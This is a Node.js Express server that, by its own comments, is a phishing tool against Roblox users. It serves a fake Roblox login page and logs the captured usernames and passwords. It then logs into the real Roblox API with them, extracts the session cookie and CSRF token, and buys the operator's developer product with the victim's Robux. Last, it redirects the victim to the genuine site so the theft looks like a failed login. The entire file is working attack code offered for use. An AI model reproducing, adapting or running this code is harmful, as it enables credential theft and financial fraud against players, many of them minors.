const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const PRODUCT_ID = "1832332442"; // Set your developer product ID here

// Phishing login page
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Roblox - Log In</title></head>
    <body style="font-family: Arial; text-align: center; margin-top: 50px;">
      <h2>Roblox</h2>
      <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
      </form>
    </body>
    </html>
  `);
});

// Capture credentials, log into Roblox, get cookie, buy product
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  console.log('CAPTURED CREDS:', username, '|', password);

  try {
    // 1. Authenticate with Roblox to get cookie
    const authRes = await axios.post('https://auth.roblox.com/v2/login', {
      ctype: 'Username',
      cvalue: username,
      password: password
    }, { validateStatus: false });

    const cookie = authRes.headers['set-cookie']
      ?.find(c => c.startsWith('.ROBLOSECURITY'))
      ?.split(';')[0];

    if (!cookie) {
      console.log('Login failed or no cookie');
      return res.redirect('https://www.roblox.com/login?error=1');
    }

    console.log('GOT COOKIE:', cookie);

    // 2. Get CSRF token for purchases
    const tokenRes = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { Cookie: cookie },
      validateStatus: false
    });
    const csrf = tokenRes.headers['x-csrf-token'];

    // 3. Auto-buy your product (2 Robux)
    const buyRes = await axios.post(`https://economy.roblox.com/v1/purchases/products/${PRODUCT_ID}`, {
      expectedPrice: 2
    }, {
      headers: {
        Cookie: cookie,
        'x-csrf-token': csrf,
        'Content-Type': 'application/json'
      }
    });

    console.log('PURCHASE RESULT:', buyRes.data);
    // Redirect victim to real Roblox, looks like a failed login
    res.redirect('https://www.roblox.com/login');
  } catch (e) {
    console.log('ERROR:', e.response?.data || e.message);
    res.redirect('https://www.roblox.com/login');
  }
});

app.listen(port, () => console.log('Auto drain server running on port ' + port));
